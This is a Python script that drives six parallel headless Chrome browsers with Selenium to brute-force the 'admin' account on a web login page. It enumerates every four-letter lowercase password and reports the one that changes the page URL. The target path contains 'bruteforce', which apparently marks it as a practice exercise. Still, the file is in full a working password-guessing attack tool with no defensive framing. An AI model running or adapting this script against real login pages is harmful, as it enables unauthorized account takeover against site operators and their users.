from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import requests
from requests.exceptions import ConnectTimeout
import multiprocessing as mp
chars = 'abcdefghijklmnopqrstuvwxyz'
login = 'admin'
passwords = [a+b+c+d for a in chars for b in chars for c in chars for d in chars]
count = 6


def cracker(i,passwords,foundit,ret_list):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--allow-running-insecure-content')
    options.add_argument("--disable-extensions")
    options.add_argument("--proxy-server='direct://'")
    options.add_argument("--proxy-bypass-list=*")
    options.add_argument("--start-maximimized")
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument("--FontRenderHinting[none]")
    options.add_argument('--no-sandbox')
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-client-side-phishing-detection")
    options.add_argument("--disable-crash-reporter")
    options.add_argument("--disable-oopr-debug-crash-dump")
    options.add_argument("--no-crash-upload")
    options.add_argument("--disable-low-res-tiling")
    options.add_argument("--log-level=3")
    options.add_argument("--silent")
    browser = webdriver.Chrome(options=options)
    browser.get('https://dudo.gvpt.sk/bruteforce/account/login')
    #in_name = WebDriverWait(browser,1).until(EC.presence_of_element_located((By.NAME,'username')))
    #in_pass = WebDriverWait(browser,1).until(EC.presence_of_element_located((By.NAME,'password')))
    #sub = WebDriverWait(browser,1).until(EC.presence_of_element_located((By.NAME,'action')))
    time.sleep(5)
    start = ((len(passwords)//count) * (i))
    end = (len(passwords)//count) * (i+1)
    for password in passwords[start:end:]:
        if not foundit.is_set():
            in_name = browser.find_element(By.NAME,'username')
            in_pass = browser.find_element(By.NAME,'password')
            sub = browser.find_element(By.NAME,'action')
            in_name.send_keys(login)
            in_pass.send_keys(password)
            sub.click()
            if browser.current_url != 'https://dudo.gvpt.sk/bruteforce/account/login':
                ret_list.append(password)
                foundit.set()
                print(f'found{password}')
                break
            if passwords.index(password)%1000==0:
                print(f'1000 - {i}')
    print(f'finish - {i}')




    browser.close()
pool = []
if __name__ =='__main__':
    foundit = mp.Event()
    manager = mp.Manager()
    ret_list = manager.list()
    for i in range(count):
        pool.append(mp.Process(target= cracker, args = (i,passwords,foundit,ret_list)))
    for p in pool:
        p.start()
    foundit.wait()
    for p in pool:
        p.terminate()
    for p in pool:
        p.join()

    print(ret_list)
    print('all joined')
